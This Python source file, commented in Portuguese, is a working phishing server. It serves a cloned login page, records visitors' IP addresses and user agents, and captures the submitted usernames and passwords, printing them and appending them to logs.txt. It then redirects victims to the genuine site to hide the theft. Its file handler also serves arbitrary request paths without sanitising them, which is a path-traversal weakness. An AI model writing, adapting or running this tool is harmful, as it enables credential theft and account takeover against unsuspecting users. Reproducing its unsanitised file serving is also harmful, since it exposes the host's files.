from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from datetime import datetime


class ServerHandler(SimpleHTTPRequestHandler):
    redirect_Original_website, redirect_Path = None, None

    def do_GET(self):
        ip = self.client_address[0]
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        user_agent = self.headers.get('User-Agent', 'N/A')
        
        print(f"[{timestamp}] [GET] Conexão de {ip} - User-Agent: {user_agent}")
        
        # Tenta servir o conteúdo da página clonada
        if self.path == '/' or self.path == '/index.html':
            try:
                with open("index.html", "rb") as file:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_error(404, "Arquivo index.html não encontrado.")
        else:
            try:
                file_path = self.path.lstrip('/')
                with open(file_path, "rb") as file:
                    content_type = "text/plain"
                    if file_path.endswith(".css"):
                        content_type = "text/css"
                    elif file_path.endswith(".js"):
                        content_type = "application/javascript"
                    elif file_path.endswith(".png"):
                        content_type = "image/png"
                    elif file_path.endswith(".jpg") or file_path.endswith(".jpeg"):
                        content_type = "image/jpeg"
                    elif file_path.endswith(".gif"):
                        content_type = "image/gif"
                    self.send_response(200)
                    self.send_header("Content-type", content_type)
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_error(404, f"Arquivo {self.path} não encontrado.")

    def log_message(self, format, *args):
        # Evita log padrão
        return

    def redirect(self, page="/"):
        if not page.startswith('http://'):
            page = 'http://' + page
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_POST(self):
        ip = self.client_address[0]
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        user_agent = self.headers.get('User-Agent', 'N/A')

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Parse manual para não depender do obsoleto cgi.FieldStorage
        from urllib.parse import parse_qs
        parsed_data = parse_qs(post_data)

        uname = parsed_data.get("username", [""])[0]
        passwd = parsed_data.get("password", [""])[0]

        # Log em terminal
        print(f"[{timestamp}] [POST] Dados capturados de {ip}")
        print(f"User-Agent: {user_agent}")
        print(f"Usuário: {uname}")
        print(f"Senha: {passwd}")
        print("-" * 40)

        # Salvar em arquivo
        with open("logs.txt", "a") as file:
            file.write(f"[{timestamp}] IP: {ip}\nUser-Agent: {user_agent}\n")
            file.write(f"Usuário: {uname}\nSenha: {passwd}\n")
            file.write("-" * 40 + "\n")

        # Redireciona para o site legítimo
        self.send_response(302)
        self.send_header("Location", "https://www.site-real.com")
        self.end_headers()

class HTTPServerPhishing:
    def __init__(self, Address, PORT, redirect=None, directory=None):
        self.Address, self.PORT = Address, PORT
        self.Handler = ServerHandler
        self.Handler.redirect_Original_website = redirect
        self.Handler.redirect_Path = directory

    def Method_GET_LOG(self, format, *args):
        print(list(args)[0])

    def run(self):
        self.httpd = HTTPServer((self.Address, self.PORT), self.Handler)
        self.Handler.log_message = self.Method_GET_LOG
        self.httpd.serve_forever()
